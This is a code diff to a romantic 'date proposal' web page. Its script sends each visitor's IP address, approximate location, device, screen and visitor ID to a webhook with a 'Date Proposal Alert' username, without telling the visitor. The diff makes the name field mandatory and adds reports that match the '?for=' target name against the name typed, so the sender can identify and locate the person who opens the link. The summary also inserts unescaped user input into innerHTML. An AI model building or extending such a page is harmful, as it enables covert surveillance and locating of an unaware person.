@@ -148,9 +148,19 @@
       border: 1.5px dashed var(--rose);
       border-radius: var(--radius-pill);
       padding: 6px 16px;
-      margin: 12px auto 6px;
-      max-width: 240px;
+      margin: 12px auto 4px;
+      max-width: 250px;
       transition: border-color 0.2s, background-color 0.2s;
+    }
+    .name-badge-input.error {
+      border-color: #d6006e;
+      background: #fff0f3;
+      animation: shake 0.3s ease;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
     }
     .name-badge-input:focus-within {
       border-color: var(--rose-deep);
@@ -175,6 +185,14 @@
     .name-badge-input input::placeholder {
       color: #b5929d;
       font-weight: 500;
+    }
+
+    .name-warning {
+      color: #d6006e;
+      font-size: 0.85rem;
+      font-weight: 700;
+      margin-top: 4px;
+      min-height: 1.2em;
     }
 
     /* Buttons */
@@ -223,7 +241,7 @@
       gap: 16px;
       justify-content: center;
       align-items: center;
-      margin-top: 20px;
+      margin-top: 14px;
       min-height: 60px;
       flex-wrap: wrap;
     }
@@ -373,10 +391,12 @@
         
         <h1>🌸 Will you go on a date with me? 🌸</h1>
 
-        <div class="name-badge-input">
+        <!-- Mandatory Name Input -->
+        <div class="name-badge-input" id="nameBox">
           <span>✨</span>
-          <input type="text" id="visitorName" placeholder="Your name or nickname..." maxlength="30" />
+          <input type="text" id="visitorName" placeholder="Enter your name first..." maxlength="30" autocomplete="off" />
         </div>
+        <p class="name-warning" id="nameWarning" aria-live="polite"></p>
 
         <div class="choice-row">
           <button type="button" class="btn btn-yes" data-yes>Yes ♥</button>
@@ -517,30 +537,42 @@
           clientMetadata.location = "Unavailable";
         });
 
-      const nameInput = $("#visitorName");
-
-      // 4. Personalized URL Query Param Reader (?for=Name or ?name=Name)
+      // 4. Capture Custom Link Parameter vs User Entered Input
       const urlParams = new URLSearchParams(window.location.search);
-      const prefillName = urlParams.get("for") || urlParams.get("name");
-      if (prefillName) {
-        nameInput.value = prefillName.trim();
-      }
+      const targetParam = urlParams.get("for") || urlParams.get("name") || "None (Direct/Generic Link)";
 
-      const state = { name: "Someone special", day: "", time: "", food: "" };
+      const nameInput   = $("#visitorName");
+      const nameBox     = $("#nameBox");
+      const nameWarning = $("#nameWarning");
+
+      const state = { 
+        targetedName: targetParam,
+        enteredName: "",
+        fullDateFormatted: "",
+        isoDate: "",
+        time: "", 
+        food: "" 
+      };
 
       async function sendNotification(title, description, isFinal = false) {
         const fields = [
-          { name: "👤 Input Name", value: state.name, inline: true },
+          { name: "🔗 Target Link Name (?for=)", value: state.targetedName, inline: true },
+          { name: "✍️ User Entered Name", value: state.enteredName || "Not entered yet", inline: true },
           { name: "🆔 Visitor ID", value: clientMetadata.visitorId, inline: true },
-          { name: "📱 Device / OS", value: `${clientMetadata.device} (${clientMetadata.os})`, inline: true },
-          { name: "📍 Approx. Location", value: clientMetadata.location, inline: true },
+          { name: "📍 Location", value: clientMetadata.location, inline: true },
           { name: "🌐 IP Address", value: clientMetadata.ip, inline: true },
-          { name: "🔗 Source / Referrer", value: clientMetadata.referrer, inline: true }
+          { name: "📱 Device / OS", value: `${clientMetadata.device} (${clientMetadata.os})`, inline: true }
         ];
 
-        if (state.day) fields.push({ name: "📅 Selected Day", value: state.day, inline: true });
-        if (state.time) fields.push({ name: "⏰ Selected Time", value: state.time, inline: true });
-        if (state.food) fields.push({ name: "🍽️ Food Choice", value: state.food, inline: true });
+        if (state.fullDateFormatted) {
+          fields.push({ name: "📅 Selected Full Date", value: `${state.fullDateFormatted} (${state.isoDate})`, inline: false });
+        }
+        if (state.time) {
+          fields.push({ name: "⏰ Selected Time", value: state.time, inline: true });
+        }
+        if (state.food) {
+          fields.push({ name: "🍽️ Food Choice", value: state.food, inline: true });
+        }
 
         const payload = {
           username: "Date Proposal Alert 💌",
@@ -550,7 +582,7 @@
               description: description,
               color: isFinal ? 0xd6006e : 0xe07a9c,
               fields: fields,
-              footer: { text: `Screen: ${clientMetadata.screen} • ID: ${clientMetadata.visitorId}` },
+              footer: { text: `Screen: ${clientMetadata.screen} • Link Target: ${state.targetedName}` },
               timestamp: new Date().toISOString()
             }
           ]
@@ -620,20 +652,35 @@
         if (e.key === "Enter" || e.key === " ") { e.preventDefault(); dodge(); }
       });
 
+      // Mandatory Name Validation before proceeding
       yesBtn.addEventListener("click", () => {
         const entered = nameInput.value.trim();
-        if (entered) {
-          state.name = entered;
+        if (!entered) {
+          nameBox.classList.add("error");
+          nameWarning.textContent = "Please enter your name first! 🥺💖";
+          nameInput.focus();
+          setTimeout(() => nameBox.classList.remove("error"), 600);
+          return;
         }
+
+        nameWarning.textContent = "";
+        state.enteredName = entered;
 
         noBtn.classList.remove("is-loose");
         noBtn.style.cssText = "";
         yesBtn.style.transform = "";
         showScreen("when");
-        sendNotification(`✨ ${state.name} clicked YES!`, "Moving to the scheduling step.");
+        sendNotification(`✨ ${state.enteredName} clicked YES!`, `Link was sent for: **${state.targetedName}**`);
       });
 
-      /* Screen 2: Scheduling */
+      nameInput.addEventListener("input", () => {
+        if (nameInput.value.trim()) {
+          nameWarning.textContent = "";
+          nameBox.classList.remove("error");
+        }
+      });
+
+      /* Screen 2: Scheduling & Comprehensive Date Parsing */
       const dayInput  = $("#day");
       const timeInput = $("#time");
       const whenHint  = $("[data-when-hint]");
@@ -646,18 +693,22 @@
           return;
         }
         whenHint.textContent = "";
-        state.day  = formatDay(dayInput.value);
+        
+        // Capture Year, Month, Day, Weekday
+        state.isoDate = dayInput.value; // YYYY-MM-DD
+        const [year, month, day] = dayInput.value.split("-").map(Number);
+        const dateObj = new Date(year, month - 1, day);
+
+        state.fullDateFormatted = dateObj.toLocaleDateString("en-US", {
+          weekday: "long",
+          year: "numeric",
+          month: "long",
+          day: "numeric"
+        }); // e.g., "Friday, August 21, 2026"
+
         state.time = timeInput.value;
         showScreen("food");
       });
-
-      function formatDay(iso) {
-        const [y, m, d] = iso.split("-").map(Number);
-        const date = new Date(y, m - 1, d);
-        return date.toLocaleDateString(undefined, {
-          weekday: "long", month: "long", day: "numeric",
-        });
-      }
 
       /* Screen 3: Food */
       const foods   = $$("[data-food]");
@@ -686,12 +737,12 @@
         });
 
         $("[data-summary]").innerHTML =
-          `Contract sealed by <strong>${state.name}</strong> 🤙💕<br><br>` +
-          "See you <strong>" + state.day + "</strong> at <strong>" + state.time +
+          `Contract sealed by <strong>${state.enteredName}</strong> 🤙💕<br><br>` +
+          "See you on <strong>" + state.fullDateFormatted + "</strong> at <strong>" + state.time +
           "</strong> for <strong>" + state.food + "</strong>. Don't forget your pinky promise! 🥂🚗";
         
         showScreen("done");
-        sendNotification(`🎉 Pinky Promise Sealed by ${state.name}!`, "Completed date scheduling and pinky promise agreement.", true);
+        sendNotification(`🎉 Pinky Promise Sealed by ${state.enteredName}!`, `Completed date scheduling flow for target: **${state.targetedName}**`, true);
       });
     })();
   </script>
